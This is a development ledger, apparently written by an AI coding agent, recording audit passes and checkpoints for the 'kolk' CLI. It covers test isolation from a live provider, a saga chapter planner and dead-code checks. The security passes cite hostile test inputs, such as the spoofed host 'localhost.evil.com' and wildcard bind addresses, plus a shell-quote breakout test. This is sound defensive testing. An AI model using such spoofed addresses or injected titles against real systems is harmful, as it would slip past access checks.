holds the change is a way to lose the change.

Acceptance checklist:

- [x] every package checked for network reachability by time, by client construction, and by real-path resolution.
- [x] the one unpointed client verified never to call.
- [x] the guard applied before the idempotency short-circuit, not after.
- [x] hand-isolating tests routed through the guard.
- [x] a test's own mock is never clobbered.
- [x] the guard's property pinned by two tests.
- [x] full `make check` green: 2,058 tests, 0 lint issues.

### S10.9 the test suite cannot reach a provider — verified detail

**First, a correction.** The previous entry said the leak was the OS keychain, "which no environment
variable redirects". That was wrong and I stated it as fact.
`resolveOpenRouterCredential` reads exactly two things: `OPENROUTER_API_KEY` and the file manifest
under the isolated data directory. No keychain is involved. I inferred a mechanism instead of reading
the function, which is the failure this whole audit has been correcting in other people's work.

**The real mechanism was simpler and worse.** `newTestApp` took no `*testing.T`, so it *could not*
isolate — isolation was a separate call each test had to remember, and **44 of the 100 tests using it
did not**. Those ran against the developer's real config, data and cache directories, and the real
`OPENROUTER_API_KEY` from the shell running `make check`.

**Isolation someone can forget is isolation that will be forgotten.** `newTestApp(t, stdin)` now
isolates unconditionally, which required making `isolateHome` idempotent: a second call returns the
isolation the first set up rather than pointing the process at a fresh temp directory the caller has
never heard of.

**And a stray call now fails instead of succeeding.** `isolateHome` used to blank
`OPENROUTER_BASE_URL`, and blank means "use the real API". It now points at `127.0.0.1:1`, a closed
port, so a test that reaches a provider by accident fails in milliseconds rather than spending
somebody's quota.

That guard immediately found three more tests making live calls, none of which anyone knew about:
two first-run tests that configured their mock through the config file while the environment beat it,
and `TestModelAndEffortTopLevelCommandsWork`, which listed a model catalog by fetching it from
openrouter.ai every run. The first two now point at their mock through the environment; the third
seeds a cached catalog, which keeps it a test about the command rather than about the network.

**The evidence is in the clock.** `internal/cli` took **126 seconds** before this checkpoint and takes
**0.46 seconds** after. That two minutes was real network I/O in a suite the project describes as
offline.

Acceptance checklist:

- [x] the wrong keychain diagnosis corrected in the record, not quietly dropped.
- [x] isolation moved into the constructor so it cannot be omitted.
- [x] isolateHome made idempotent so double isolation is safe.
- [x] a stray provider call now hits a closed port, not the real API.
- [x] the three tests that guard exposed fixed to work offline.
- [x] suite time for internal/cli: 126s → 0.46s.
- [x] full `make check` green: 2,056 tests, 0 lint issues.

### S10.8 the next-chapter planner — verified detail

`docs/plan/10-saga-loop.md` §1.1 asks the saga to "select exactly one discrete, manageable task that
moves closer to the goal", having read what the previous chapters achieved. Built in three
checkpoints; two shipped and the third was reverted, which is the more useful half of this record.

**A: the planner port.** `ChapterPlanner` returns one title, or `""` when the goal is met. The loop
asks for a chapter only when nothing is pending, appends it, and works it. Tested entirely with a
fake — the budget ceiling, the sequential numbering, a failing planner, and the planner seeing the
previous chapters' outcomes, all without a provider.

Two distinctions that fall out of having a planner. **`no-work` now means different things.** Without
a planner, running out of chapters means the hand-written list ended, which says nothing about the
goal; with one, it means the planner judged the goal met. The loop reports `StopNoWork` and
`StopGoalComplete` accordingly, because a saga claiming success for running out of plan would be the
worst possible lie for it to tell. And **a failing planner is an error, not a stop** — a planner that
cannot answer is a broken saga, not a finished one.

**B: the agent planner.** Runs on the fast lane, not the session model: choosing one next step from a
short list is a cheap judgement, and paying the coding model for it once per chapter is how a saga's
cost drifts away from the work it is doing. Failed chapters go into the prompt *with their
verification message*, because repeating a chapter that just failed the same way is precisely the
loop the doom detector exists to stop, and the planner is the only thing that can avoid it. A
multi-line answer is cut to its first line: "exactly one discrete task" is the rule, and the title
ends up in a commit message.

**C was reverted, and that is the finding.** The napkin test shows `kolk saga "<goal>"` starting the
run, so I made it do that — and the suite hung. Recording a goal now required a model, a key and a
network, and with no key it hung in catalog discovery rather than refusing. Setting down an intention
is a cheap local act and should stay one, so the verb records the goal and says
`start it with kolk saga resume`. The doc's napkin test is aspirational on this point and the code
now disagrees with it deliberately.

Acceptance checklist:

- [x] a goal with no chapters plans one, works it, and stops as goal-complete.
- [x] the planner sees the previous chapters and their outcomes.
- [x] chapters are numbered in sequence; planning respects the chapter ceiling.
- [x] a failing planner stops the run rather than looping.
- [x] hand-written chapters still work with no planner, reporting no-work.
- [x] DONE in any casing ends the saga; a multi-line title is cut to one line.
- [x] full `make check` green: 2,056 tests, 0 lint issues.

### S10.9 the test suite can reach a provider — blocked, recorded 2026-08-27

Wiring `resume` to the loop exposed something worse than the change: **`make check` made a live
OpenRouter request.** `TestSagaSubcommandsReportTheRealStateOfAnActiveSaga` called `saga resume`,
which since S10.6 builds an agent, and the call came back `HTTP 429: free-models-per-day` — a real
rate limit, against the owner's real quota.

`isolateHome` sets `KOLK_CONFIG_DIR`, `KOLK_DATA_DIR`, `KOLK_CACHE_DIR` and blanks
`OPENROUTER_API_KEY`, so the isolation looks complete. It is not: `resolveOpenRouterCredential` also
reads the **OS keychain**, which no environment variable redirects. A test that believes it has no
credentials can therefore have the user's.

That also qualifies an earlier claim in this ledger. When the test suite was fixed to stop writing
into real Kolkrabbi state, the verification was by file checksum — which proves nothing about a
keychain.

The immediate bleeding is stopped: that test no longer calls `resume`, and the loop's behaviour is
covered offline with fakes. The real fix is a seam that makes provider access impossible from a test
rather than merely unlikely, and it deserves its own checkpoint rather than a hurried patch at the
end of another one.

### S10.7 resume is the resume anchor — verified detail

A review-before-building tick. Three things were on the list and only one needed code.

**`kolk saga resume` was lying, and I made it lie.** It printed "the saga loop is not wired to this
command yet"; S10.6 wired it the checkpoint before, and nothing walked back to the sentence claiming
otherwise. That is exactly the failure gate 8 was added for — **written the day before, and broken by
the next checkpoint I wrote.** The gate is not automatic and this is what that costs.

`docs/plan/10-saga-loop.md` settles which verb is which: it calls `SAGA.md` "the authoritative resume
anchor (`kolk saga resume`)". So `resume` is the spec's verb and `run` is the alias. Both work
whatever is outstanding, because the loop is idempotent — starting and resuming are the same act, and
two commands that differ only in name would be worse than one.

**`kolk saga rewind` was left alone, because its message is true.** It says rewinding is not wired,
and it is not. A test now pins that sentence, so whoever builds rewind has to delete a failing
assertion rather than leave the claim behind — gate 8 made mechanical for the one case where it can
be.

**The larger finding needs no code yet, and is recorded rather than acted on.** The doc's own napkin
test is:

    $ kolk saga "migrate sqlite store to modernc.org/sqlite and verify tests"
    chapter 1: audit existing database package and list dependencies
      ✓ chapter 1 committed [cost: $0.02 · 18s]
    chapter 2: replace cgo sqlite import with modernc.org/sqlite

So the spec's saga **decides each chapter as it goes** — one bounded change at a time, chosen with the
previous chapter's result in hand. It never asks anyone to write chapters into `SAGA.md` by hand,
which is what S10.6's executor requires today, and `kolk saga <goal>` is meant to start the loop
rather than only record the goal.

That is the next checkpoint, and it is a feature rather than a fix: a next-chapter planner, and
`kolk saga <goal>` starting the run. Left unbuilt this tick deliberately — the instruction was to
build only if necessary, and a false message was necessary while a missing feature is a decision.

Acceptance checklist:

- [x] resume works the chapters and no longer claims the loop is unwired.
- [x] resume with no saga still says so.
- [x] rewind's honest limit is preserved and pinned by a test.
- [x] which verb the spec prefers established from the doc, not guessed.
- [x] the planner gap analysed, recorded, and deliberately not built.
- [x] full `make check` green: 2,045 tests, 0 lint issues.

### S10.6 the chapter executor — verified detail

The half X5 found missing. The state machine, quality gates, budget guards and artifact writer all
existed and nothing walked the chapters, so none of it could run and `kolk saga` could only set a
goal and print status.

**`ChapterWorker` is a port, and that is the whole shape of it.** The loop that spends a budget and
counts failures has no idea a model exists; `AgentWorker` is the only place the saga meets one. That
is what let the budget ceiling, the cost ceiling, the doom-loop guard and cancellation all be tested
without a provider, and it is what would let a chapter later be worked by a subagent or a different
model without touching the loop.

**Cost is a difference, not a total.** `AgentWorker` reads the session's spend before and after its
turn. Charging a chapter the session's running total would make every chapter look dearer than the
last and stop a saga early for money it had already counted — the same mistake B12.11 fixed for
turns, arriving again one level up.

**Cost is recorded even when the work fails.** A failed attempt still spent money, and a budget that
only counts successes cannot stop a saga that is failing expensively — which is precisely the case
the doom-loop guard exists for.

**A failed chapter is not verified.** Running gates on work that was never done would commit whatever
happened to be in the tree and call it the chapter. The chapter goes to `failed` and the loop moves
on, or stops if failures have piled up.

**`no-work` is not `goal-complete`.** A plan that ran out of chapters is a different ending from one
whose acceptance criteria are met, and reporting the first as the second would be a saga claiming
success for stopping.

**The git check happens before the first turn**, because every chapter ends in a commit and finding
out there is no repository after a chapter's tokens are spent is the wrong moment. Verified through
the binary: a directory with no `.git` refuses with that sentence, and a saga whose chapters are all
finished says so without starting a model.

**The dead-export rot test caught its first real drift**, unprompted: `SagaBudget` had been sitting in
the allowlist as untriaged, and `kolk saga run` gave it a caller. The test failed rather than letting
the exemption quietly become a lie. That is the ratchet earning its place a day after being written.

Acceptance checklist:

- [x] a chapter is worked, then verified, and its cost lands on the chapter and the total.
- [x] a chapter that cannot be worked fails without committing anything.
- [x] SAGA.md is written after every chapter, and a write failure does not discard the work.
- [x] the run stops at the chapter ceiling, the cost ceiling and the doom-loop threshold.
- [x] cancellation stops the run and is not reported as a budget stop.
- [x] a run with nothing to do says so instead of starting a turn.
- [x] the agent worker charges only its own turn, and a failed turn fails the chapter.
- [x] verified through the binary: no repository, and nothing left to work.
- [x] full `make check` green: 2,042 tests, 0 lint issues.

### X5 one saga verification path, the ports one — verified detail

The owner chose wire-and-drop on the duplication pass 4 found. Doing it turned up something the audit
had not: **neither path was reachable**. `kolk saga` sets a goal, prints status, resumes, stops and
rewinds; it never executes or verifies a chapter. `VerifySagaChapter`, the CLI boundary of the
supposedly live path, has no caller either — it was sitting in the dead-export allowlist marked
untriaged. So this was not "one live implementation and one dead one". It was two unreachable ones,
and the saga's execution half has never been built.

That is worth stating plainly because it changes what "wire it" could mean. Wiring `ChapterVerifier`
into a chapter executor that does not exist would have meant inventing the executor. What is done
here is the part that is unambiguous: **one implementation, behind the ports, with the duplicate
deleted.** Whether `kolk saga` should run chapters is a separate decision and stays open.

**Built the two port implementations that never existed.** `ChapterVerifier` was written against
`QualityGateRunner` and `GitCheckpointer` and only fakes ever satisfied them, which is exactly why an
ad-hoc copy grew beside it: there was nothing real to call. `NewCommandGateRunner` and
`NewCommandCheckpointer` are those implementations, over the `CommandRunner` port the engine already
had, so nothing new reaches for the platform layer.

**Added cancellation the ports were missing.** `RunGates` and the checkpointer methods took no
context, which would have meant a quality gate nobody could interrupt — and `kolk saga stop` exists.
A `make check` that runs for two minutes has to be stoppable, so both carry a context and a cancelled
one stops before the next gate rather than after it.

**Two behaviours improved on the way, both from the ports design being better.** Gates now all run
even after one fails, because naming gates individually is pointless if a run only reports the first
broken one. And a chapter that changed nothing is no longer committed: the old path always committed,
the new one asks `git status --porcelain` first. An empty commit is a revision nobody can learn
anything from.

**One thing preserved deliberately**: the old path quoted a chapter title for the shell, and a title
is model-written text arriving on a command line. `shellQuote` carries that forward with a test that
tries to break out of it.

Net: 124 lines added, 322 deleted, across nine files. `DetectQualityGates`, `VerifyAndCommit`,
`VerifyAndCommitResult`, `gateFailure` and their two test files are gone; `VerifyChapter` takes a
`QualityGateDetector` instead of a pre-computed `[]string`, because with a detector in the design
passing both meant two sources of truth for one answer.

Acceptance checklist:

- [x] traced both paths to their callers before deleting either.
- [x] production implementations of both unimplemented ports, with tests.
- [x] cancellation added where a long gate would otherwise be uninterruptible.
- [x] every gate runs, and its output survives, even after an earlier failure.
- [x] a clean worktree is completed without an empty commit, pinned by a test.
- [x] shell quoting of model-written titles preserved and tested.
- [x] the two symbols left `DeadExportAllowlist`; `SagaBudget` stayed, being untouched by this.
- [x] full `make check` green: 2,026 tests, 0 lint issues.

### Final pass — what the audit found, and what to do about it — recorded detail

Eight passes over 1,208 ticked leaves, verified against code or by running the binary rather than by
reading the boxes. **No leaf claimed work that did not exist.** That is the headline, and it was not
guaranteed: the failures were all around the leaves, in the connective tissue.

**Built this pass.**

*Parity now runs both ways.* `docs/plan/09-command-surface.md` §7 states it as an equivalence and
only one direction was tested — every CLI verb needed a slash twin, but a slash-only command was
never questioned, so `/diff`, `/undo` and `/plan` arrived with no twin and nothing noticed. The other
half is now a test with an eighteen-entry `sessionOnly` list, each carrying what it acts on that a
one-shot process lacks. Proved it fails by adding `/probeonly`. Most of those eighteen are
session-only for a real reason; writing the reason down turns "nobody built the twin" into "there is
nothing for a twin to act on", which are different, and only one is a gap.

*Gate 8, walk back.* Four entries promised things that had been removed. Each was written correctly
and nothing brought the news, because all seven existing gates write forward. **A mechanical check
was tried and rejected**, which is worth recording: scanning leaf headlines for `/commands` and
`--flags` missing from the tree flags exactly the entries that correctly record a removal — "`--yolo`
is gone", "`--bare` forbidden" — and misses the ones that matter, whose claims sit on continuation
lines. Telling "promises this exists" from "records this was removed" is semantic, not textual. A
noisy gate is a gate people disable, so this is a step a person takes, written into the contract
rather than left to memory.

**Recommended, not built — these are the owner's calls.**

1. **Wire or drop `ChapterVerifier`.** 134 lines of implementation and 249 of test for a saga
   verification path nothing calls, duplicating the live one. The dead copy is the better design —
   ports only, never shell. Wiring it is the architecturally right move and a real change; dropping
   it recovers 383 lines. Either beats the current state, which is a third answer: keep both and let
   the tests imply the dead one is live.
2. **Triage the 18 `untriaged 2026-08-27` entries in `arch.DeadExportAllowlist`.** Each is a symbol
   only tests reach. Some are surface built ahead of a caller — `session.Overview` waits on I26.7 —
   and some are probably deletable. The ratchet stops new ones today; the backlog is a morning's work.
3. **Decide the five long verbs.** `completion`, `sessions`, `localia`, `pmodels`, `version` break the
   hardened six-letter rule. They shipped in v1.2.1, so renaming is a deprecation with a cost to
   users. Shorten some on a major, or amend the rule to "short unless the shorter name reads worse".
4. **Item 16 and items 27–29 have no hardening doc.** Item 16 is the last of phase G; 27–29 are the
   rest of phase I. Nothing is blocked on them, but phase G cannot close without 16.
5. **`internal/tui` exports 36 symbols nothing outside it uses.** Not a defect — a package exporting
   an API its own tests exercise is a legitimate choice — but it is the largest such surface in the
   tree and worth one deliberate look.

**What the audit says about the project.** The code is in better shape than the paperwork: eight
mutation tests against this week's work were caught eight times, the updater verifies before it
replaces, the dashboard genuinely refuses a network address, and compaction genuinely will not act on
an unknown window. The failures were ratchets that only pinned what someone remembered to write
down — a capability catalog missing self-update, a verb guardrail that could not fail, a linter blind
to dead exports, a parity rule enforcing half of itself. Three of those are now real checks. The
fourth needed a person.

Acceptance checklist:

- [x] parity closed in both directions, with a reason per exemption.
- [x] proved the new parity rule fails on an unaccounted command.
- [x] gate 8 added to the contract, with the rejected mechanical check recorded.
- [x] the remaining findings written as decisions with their costs, not as tasks.
- [x] full `make check` green: 2,030 tests, 0 lint issues.

### Verification pass 7 — the migration queue — recorded detail

The A-series and the phase table. Two findings, and the second is the worst-placed instance of the
pattern the whole audit has been tracking.

**A13 is accurate**, which is worth saying because it would be easy to fudge. Windows stubs exist in
`atomicfile`, `lock`, `paths`, `shell` and `term`; CI marks the Windows build advisory and its comment
cites the migration step that will make it required. An honest `[ ]` on work genuinely not done.

**A14 was open for work that shipped.** It reads "TUI, external agent adapters, and saga, separately"
and all three exist — `internal/tui`, `internal/provider/agentcli`, the saga loop. But reading it as
simply done would be wrong: this is the *migration* queue, so the row means "re-check these against
the layer rules as a group", and nobody has. Marked `[~]` with that distinction written down, because
"it exists" and "it obeys the architecture" are different claims and only the first is proven.

**The phase table was four phases out of date.** It called E "building — blocks F", F and G "queued",
and did not mention phase I at all. In fact E13.1–E13.7, F14.1–F14.6, G11.1–G11.6, G15.1–G15.3,
D17.1–D17.3, C12 and I26.1–I27.2 have all closed — 42 leaves the table did not know about.

That table is the first thing anyone reads about where the project stands, and it was the least
accurate thing in either document. The audit has now found this same failure in a leaf (U0.1
promising a removed flag), a plan row (item 24 listing shipped work as open), a checkpoint group
(A12 promising SQLite after SQLite was refused), and now the summary itself. **Four instances is not
carelessness, it is a missing step**: nothing in the checkpoint contract says "when you close a leaf,
find what claimed it was coming". That belongs in the final pass.

Acceptance checklist:

- [x] A13's Windows claim verified against the stubs and the CI workflow.
- [x] A14's three subjects verified to exist, and the row's real meaning separated from that.
- [x] every phase's leaf states counted rather than assumed.
- [x] the phase table rewritten from those counts, with phase I added.
- [x] full `make check` green: 2,028 tests, 0 lint issues.

### X4 the rule the linter cannot provide — verified detail

Pass 6 proved by experiment that `golangci-lint` cannot see dead exported code inside `internal/`:
an obviously uncalled exported function produced `0 issues`. `unused` treats an exported identifier
as a package's public API, which is right for a library and wrong where nothing outside the module
can call it. That blind spot is how `FileGateDetector` and `ChapterVerifier` survived with green
tests.

`internal/arch/arch_test.go` already parses the tree with `go/ast` for the layer rules, so the rule
belongs beside them rather than in a new tool.

**The first version of the rule was wrong, and usefully so.** It asked "is this symbol used outside
its own directory?" and produced 214 findings — including all 36 of `internal/tui`'s exported keys
and constructors, every one deliberate. A package exporting an API its own tests exercise is a style
choice; a rule that calls it a defect is a rule people turn off. Narrowed to the thing that actually
matters: **nothing but tests refers to it.** A declaration contributes exactly one identifier, so
"non-test uses ≤ 1" means test-only. That gave 22.

**Then it missed the case it was written for.** `FileGateDetector` did not appear, because
`func (FileGateDetector) Detect(...)` counts the receiver as a use — and a method receiver is part of
a type's own definition, not a use of it. Excluding receivers brought the motivating case back and
the count to 26.

Proved the ratchet works by adding `ProbeOnly` to `internal/netaddr` and watching it fail, then
removing it — the same technique that showed the old verb guardrail could not fail.

**Two of the 26 are mine, from two days ago.** `session.Overview` was built for I26.7 and never
wired; `engine.ParseRules` is a plural nobody needed, because the CLI parses rules line by line so
one bad rule costs one rule. I criticised exactly this pattern in three earlier leaves and then did
it twice.

The allowlist is committed **as a backlog, not as justification**: three entries have a real reason,
five are explained, and eighteen say `untriaged 2026-08-27` in as many words. Dressing them up would
have made the list look settled and stopped anyone reading it. The ratchet is live for new code
today, which is the part that compounds.

Acceptance checklist:

- [x] the rule reads the tree with go/ast rather than grep.
- [x] narrowed from 214 style findings to 26 real ones, with the reason recorded.
- [x] method receivers excluded, restoring the case the rule exists for.
- [x] proved it fails on new dead code, then removed the probe.
- [x] the allowlist cannot rot: a symbol that gains callers or disappears fails a test.
- [x] full `make check` green: 2,028 tests, 0 lint issues.

### Verification pass 6 — my own week's work, by mutation — recorded detail

E13, F14, G11, G15, I26 and I27 are leaves I wrote, including the claims about them, so reading my
own tests proves nothing. Instead: break each feature in the source and check the suite notices.
Eight mutations, each reverted immediately.

| Mutation | Caught by |
|---|---|
| path confinement never reports `outside` | 3 tests in `internal/tools` |
| tool-output scrubbing discarded | `TestToolOutputIsScrubbedBeforeItIsKept`, and the bash one |
| pairing attempt cap removed | `TestTooManyWrongCodesDisarmsIt` |
| device tier ignored, read may act | `TestAReadDeviceCanWatchButNotAct` |
| diff truncates the tail, not the middle | tests in both `diff` and `tools` |
| subagent guard allows what it should refuse | 3 subagent tests |
| the permission floor stops refusing | 4 tests |
| `/undo` trims history when the file restore failed | `TestAFailedFileRestoreLeavesTheConversationAlone` |

Eight for eight. After pass 3 found a guardrail that could not fail and this session produced two
vacuously-green tests of my own, that result is worth having rather than assuming.

One note on method: mutation 8 first appeared to survive, because I filtered with `-run Undo` and the
test that catches it is named `TestAFailedFileRestore…`. A mutation that "survives" is a claim about
the suite, so it deserves the same scepticism as a test that passes — I re-ran unfiltered before
believing it.

**Finding: the linter cannot see dead exported code, and `internal/` is where that matters most.**
Added `func DefinitelyNobodyCallsThis` to `internal/netaddr`, ran `make lint`, got `0 issues`.
`unused` treats an exported identifier as part of a package's API, which is right for a library and
wrong for `internal/`, where nothing outside the module can ever call it. The blind spot is the size
of every exported name in the tree — and it is exactly how `FileGateDetector` and `ChapterVerifier`
survived with passing tests, as pass 4 found.

A text sweep cannot close it: `grep` cannot tell a declaration and its doc comment from a use, which
my first two attempts demonstrated. The remedy that fits this project is an architecture test —
`internal/arch/arch_test.go` already parses the tree with `go/ast` for the layer rules, so "an
exported symbol in `internal/` must be used outside its own package, or be unexported" belongs beside
them. Next checkpoint.

Acceptance checklist:

- [x] eight features mutated, each caught, each reverted.
- [x] an apparently-surviving mutation re-checked before being believed.
- [x] the linter's blind spot proved by experiment, not inferred.
- [x] the remedy identified in machinery the project already has.

### Verification pass 5 — C12, D17, L13 — recorded detail

Twenty leaves across sessions and context, the dashboard, and the managed local-model planner. Every
claim held. The finding is a duplication the pass exposed rather than a false claim.

**D17.2 is the most thoroughly verified leaf so far**, because it was the easiest to falsify and the
most costly if wrong. `internal/dash/page.go` contains no `<script>`, no `fetch`, no external `src`
or `href`; the handler sets `default-src 'none'` and `no-store`. And loopback is *enforced*, not
merely defaulted: `--addr 0.0.0.0:9111`, `:9111`, `192.168.1.5:9111` and `[::]:9111` are each refused
by the running binary, with a reason that says why it matters — "the dashboard is a record of
everything you have worked on".

**C12.1's "unknown never means small" is real and load-bearing.** `ShouldCompact` returns false when
the window is `0`, so an unknown window never triggers throwing conversation away. `Measured`
distinguishes a provider's own token count from an estimate, and the type's comment says the two must
never be confused when deciding to discard. C12.2b's `preCompact` keeps the replaced conversation and
`RestoreCompaction` puts it back.

**L13.5b3 holds exactly as written**, including its unusual second half: the install path refuses when
`SHA256` is empty, and this build pins none — so the code is tested and cannot run, which is what the
leaf claims and what `L13.5b4` is blocked on.

**Finding: one security predicate, implemented twice, with different correctness.** `kolk dash` and
`kolk serve` each answered "does this address reach only this machine?" in their own function. The
dash copy handled an empty host correctly. The serve copy did not, which is why `--addr :8080` bound
every interface and was served without a token until I26.1 caught it — a hole that existed for as
long as both copies did.

Extracted to `internal/netaddr`, stdlib-only, L0, with the empty host, the unparseable address and
`localhost.evil.com` each pinned by a test. Both callers now delegate; the running binary refuses the
same four addresses it refused before. The dash copy being right is precisely the argument for one
copy: the correct implementation existed the whole time and the wrong one could not learn from it.

Acceptance checklist:

- [x] the dashboard page verified to contain no script, asset or network reference.
- [x] four hostile addresses refused by the running binary, not by reading code.
- [x] compaction proven not to fire on an unknown window.
- [x] the runtime installer proven to refuse an unpinned checksum.
- [x] the duplicated predicate extracted, tested, and both callers repointed.
- [x] behaviour re-verified through the binary after the extraction.
- [x] full `make check` green: 2,026 tests, 0 lint issues.

### Verification pass 4 — S10, P11, B12 — recorded detail

Twenty-five leaves across the saga loop, provider plans and the Claude subscription backend. Every
claim checked held, which is the first pass where that is true — and the two findings are about
things around the leaves rather than in them.

**Verified.** S10.2's `VerifyAndCommit` really does run gates, commit only on green, and restore the
worktree on failure; its "automated test discovery" is real, in `DetectQualityGates`, probing for
`package.json`, a Makefile and friends. S10.3's `SagaBudget` carries the chapter limit, cost limit and
a `StopDoomLoop` reason. B12.9's `planBackendFor` selects the provider from the connector and refuses
an unusable plan model with its reason. P11.7's `unverified` state exists and says what it does not
prove. S10.5's honesty claim holds in the direction that matters: `kolk saga rewind` reports the real
saga and then says rewinding is not wired, rather than pretending.

**Finding 1: PLAN item 24 still listed as open two things that had shipped.** Its Anthropic row said
"still open: proof the provider actually authenticated, connector→backend selection for a new
session, and failure-path tests". The first two are B12.9 and P11.7a/b, both ticked, both verified
here. Only failure-path tests remain, plus B12.13's product decision. Corrected, with the
checkpoints named so the next reader can check rather than trust.

That is the *inverse* of the pattern the earlier passes found: not a leaf outliving its feature, but a
plan row that never learned its work was done. Same root cause — nothing walks back — and it cuts
both ways, making the plan look further behind than it is.

**Finding 2: a whole verification path exists that nothing calls.** `ChapterVerifier`
(`chapter_verify.go`) and `FileGateDetector` (`gates.go`) are referenced only by their own tests —
134 lines of implementation and 249 of test. The live saga path is a different implementation
entirely: `saga_adapter.go` → `VerifyChapterAndPersist` → `DetectQualityGates`. Two answers to one
question, one of them unreachable.

Two things make this worth recording rather than deleting on sight. First, **the dead one is the
better design** — its own comment says it depends only on ports and never on shell, which is the
architecture the rest of the project aims for. So the real choice is *wire it or drop it*, and that is
a decision, not a cleanup. Second, **its tests pass**, which is exactly why it survived: green tests
read as live code, and `golangci-lint`'s `unused` check does not flag exported symbols even inside
`internal/`, where nothing outside the module could ever use them.

Both files now carry an UNREACHABLE note naming the live path, so nobody reads them as load-bearing
while the decision waits. Carried to the final pass as the first optimisation candidate, along with a
systematic sweep for other exported-but-unreachable code in `internal/`.

Acceptance checklist:

- [x] every S10, P11 and B12 claim checked against code.
- [x] the saga's gate discovery, budget and doom-loop guard verified to exist.
- [x] item 24's stale open list corrected and its evidence named.
- [x] the unreachable verification path traced end to end before judging it.
- [x] both dead files marked in place rather than deleted unilaterally.
- [x] full `make check` green: 2,023 tests, 0 lint issues.

### Verification pass 3 — E7, M8, C9 — recorded detail

**E7.1 is the cleanest leaf audited so far.** Ran all twelve spellings through the binary: `low`,
`medium`, `high`, `max`, `1`–`4`, and the legacy `quick`/`standard`/`deep`/`ultra` each resolve
correctly, and `bogus` is refused naming the canonical set. E7.2's three knobs — `MaxRoundsFor`,
`TimeoutForEffort`, `maxTasksFor` — all exist and all take effort.

**C9.1's "parity engine" is weaker than the phrase suggests, in two ways.**

First, parity is checked in one direction only: every CLI verb must have a slash twin, but a
slash-only command is never questioned. `/diff`, `/undo` and `/plan`, which I added this week, have no
CLI twin and nothing noticed. `docs/plan/09-command-surface.md` §7 states the rule as an equivalence,
so the test enforces half of it.

Second, and worse: **`TestCommandNameLengthGuardrail` could not fail.** It looped over a hardcoded
list of thirteen names asserting `len(name) > 6` — every value decidable when it was written. Three
of the thirteen (`login`, `doctor`, `exit`) are not commands: two are planned, one is a REPL word. And
five real commands break the rule it claims to enforce: `completion` (10), `sessions` (8), `localia`,
`pmodels`, `version` (7 each). The doc names this test as the mechanism behind "All verbs are ≤ 6
letters", so a hardened policy has been unenforced since it was written.

The test now reads `commandTable()`. Proved it can fail by renaming `key` to `authenticate` and
watching it catch it — the old test passed on the same tree. The five violations are recorded as
`longVerbs` with a reason each rather than renamed: `kolk sessions` and `kolk version` shipped in
v1.2.1, so renaming is a deprecation with a cost to users and the owner's call. A second test rejects
an exemption for a command that no longer exists, so the list cannot rot the way the old one did.

**This is the third instance of one pattern**, after the site capability catalog and the U0.1
supersession: *a ratchet that only pins what somebody remembered to write down is not a check that
the set is right.* Pass 1 found a catalog missing a capability, pass 2 a leaf outliving its feature,
pass 3 a guardrail that never observed its subject. Worth carrying into the final pass.

**Left for the owner:** whether to shorten any of the five on a major, or amend the rule to "short
unless the shorter name reads worse". `version` is what every other CLI calls it.

Acceptance checklist:

- [x] every effort spelling verified by running the binary.
- [x] the three effort knobs exist and are wired to effort.
- [x] the parity test's actual direction established and recorded.
- [x] the length guardrail rewritten to read the command table.
- [x] proved the new guardrail fails where the old one passed.
- [x] exemptions carry reasons and cannot outlive their commands.
- [x] the policy doc amended rather than left contradicting the tree.
- [x] full `make check` green: 2,023 tests, 0 lint issues.

### Verification pass 2 — the U0 group — recorded detail

Twenty leaves covering auto-approve, the prompt, the model catalog, rate-limit recovery, the updater,
the octopus and the persistent TUI. Verified against code, not the boxes.

**Holds.** `U0.1b`'s `kolk-<mode>` prompt is `responseLabel()`. `U0.1e` classifies specifically —
`internal/engine/retry.go` retries only a `429`, not every HTTP error. `U0.2b` and `U0.2c` are the
ones worth checking carefully and they are right: `fetchVerifiedArtifact` compares a SHA-256 against
the signed manifest *before* returning any bytes, there is a cancellation check between verification
and replacement, and the replace runs at `0o755`. Nothing exposes an unverified binary.

**One finding: U0.1 describes a surface that no longer exists.** It claims to preserve `-y` and
`/yolo` compatibility, and E13.2 deleted both along with the `Agent.Yolo` boolean the leaf toggled.
The only `-y` left in the tree is `kolk localia --yes`, unrelated. Marked half-superseded in both the
leaf and its detail entry — `/auto-approve` is still real, as the middle of three tiers.

This is the same shape as the A12/SQLite finding from the plan audit: a later decision invalidated an
earlier leaf and nothing walked back to say so. Two instances is a pattern worth naming — **when a
checkpoint removes something, the leaves that promised it do not know.** Nothing in the contract
requires checking, and the ledger is now long enough that nobody will notice by reading.

**Not a finding, though it looked like one.** `U0.3` added a loading octopus and `U0.4e` removed it,
yet the tree has one again. That history is coherent: the other agent's `G11.5` brought it back at
icon size, recorded properly. Removed and later restored is a real sequence, not a contradiction.

Acceptance checklist:

- [x] the updater verifies before exposing bytes, and replaces at 0755.
- [x] rate-limit recovery is specific to 429, not blanket retry.
- [x] the prompt, model catalog and TUI status claims hold in code.
- [x] the one stale claim is marked superseded in both places it appears.
- [x] the octopus sequence traced across U0.3, U0.4e and G11.5 before judging it.
- [x] full `make check` green.

### Verification pass 1 — T0, W0, R0, R1 — recorded detail

First of a series re-verifying ticked checkpoints against the tree rather than trusting the box.
Method: take each leaf's falsifiable claim and check it in code or by running the binary.

**T0.1 credential store** holds on all four claims: `lock.Acquire` around the manifest,
`atomicfile.Write`, `0o600` on both the write and a repair chmod, and `Secret.String`/`GoString`
redacting so a `%v` or `%#v` cannot print a key.

**T0.2 key command** verified by running it: `kolk key not-a-key` refuses rather than guessing a
provider, and the refusal does not echo the input back.

**T0.3 first-run path** verified by running with empty config, data and cache directories: three
lines, exactly as claimed.

**R0.1 / R0.2** verified from `kolk help`: chat, code and agent all present, code the default.

**R1.2 was overstated, and this is the pass's one real finding.** It claimed to "bring the public
capability catalog back in line with what the binary does". Comparing every command in `kolk help`
against `site/capabilities.html` found two absent: `pmodels`, which is a sub-browser and arguably
covered by the plans card, and **`update`, which is not covered by anything**. Self-update shipped as
four checkpoints — U0.2a discovery, U0.2b artifact verification, U0.2c atomic replacement, U0.2d
command surface — and the catalog that was re-reviewed for the release does not mention it at all.

Worth noting how it slipped: `scripts/test-site.sh` had 44 capability assertions and none covered
update, so the ratchet meant to stop the catalog drifting only pinned what somebody remembered to
add. A ratchet is not a check that the set is complete. Added the card and the assertion; the site
contract is 138 checks now.

Also worth recording as a lesson about this audit itself: my first comparison ran against
`site/index.html` and reported eighteen missing capabilities, which looked alarming and was wrong —
the claim names `capabilities.html`. Reading the leaf's own detail before judging it is the
difference between an audit and a false alarm.

Acceptance checklist:

- [x] T0.1's four properties each verified in code.
- [x] T0.2, T0.3, R0.1, R0.2 verified by running the binary, not by grep.
